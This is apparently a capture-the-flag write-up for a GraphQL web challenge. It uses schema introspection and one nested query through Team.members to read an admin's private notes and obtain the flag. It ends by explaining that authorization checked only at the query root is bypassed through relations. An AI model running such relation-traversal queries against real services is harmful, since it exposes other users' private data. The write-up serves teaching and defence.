# The Shape of a Query

| | |
|---|---|
| **Section** | wave 1 |
| **Category** | web |
| **Solves** | 764 |

## Overview

The portal is a GraphQL API and it says so on the front page:

```
# Welcome to the portal.
# Introspection is enabled — start by exploring the schema.
```

So the first query is introspection plus a sanity check on the session:

```graphql
{
  me { id username role }
  __schema { types { name } }
  user(id: "1") { id username }
}
```

`me` returns `user_1814` / `MEMBER`, the schema lists `Query`, `User`, `Team` and `UserRoleEnum`, and `user(id: "1")` is `null`.

Introspecting the two object types gives the full picture:

```graphql
{
  __type(name: "Query") {
    fields { name args { name type { kind ofType { name } } } }
  }
}
```

The query root has exactly two fields: `me` and `user(id: ID!)`. And on `User`:

```graphql
{
  __type(name: "User") {
    fields { name type { name kind ofType { name } } }
  }
}
```

`id`, `username`, `role`, `team` and — the interesting one — `privateNotes: String`. Reading our own returns a decoy: `"Grocery list, personal reminders. Nothing worth reading."`

`Team` completes the map with `id`, `name` and `members: [User]`.

## Solve

The obvious move is to enumerate user IDs through `user(id: ...)`. It goes nowhere: `user(id: "1")` and `user(id: "user_0")` both return `null`, and the scheme is not even consistent — our account is `user_1814` but the admin is `admin_1814`, so brute forcing `user_N` would never have reached it. The ID space is a wall.

The schema points somewhere better. `Team.members` returns a list of `User` objects, which means the server resolves other users for us, and `User.privateNotes` is a plain scalar with no visibility logic attached to it. Authorization is enforced, if at all, at the query root: `me` is scoped to the caller and `user(id:)` filters what you can ask for. Nothing checks the `User` objects that are reached *through a relation* instead of through the root.

So the whole challenge is one query that follows the graph:

```graphql
{
  me {
    team {
      members {
        id
        username
        role
        privateNotes
      }
    }
  }
}
```

The response contains two members, us and the admin:

```json
{
  "members": [
    {
      "id": "user_1814",
      "role": "MEMBER",
      "privateNotes": "Grocery list, personal reminders. Nothing worth reading."
    },
    {
      "id": "admin_1814",
      "role": "ADMIN",
      "privateNotes": "POCTF{...}"
    }
  ]
}
```

The flag is in the admin's notes.

Introspection is not the vulnerability, it is the map: it turned a blind ID search into a known edge to follow. The actual bug is that object-level authorization lives on the query entry points and not on the field resolvers, so any relation acts as a way around it. The check belongs on `User.privateNotes` (or on `Team.members`), where the decision is "may this caller see this specific user", not "which users may this caller ask for".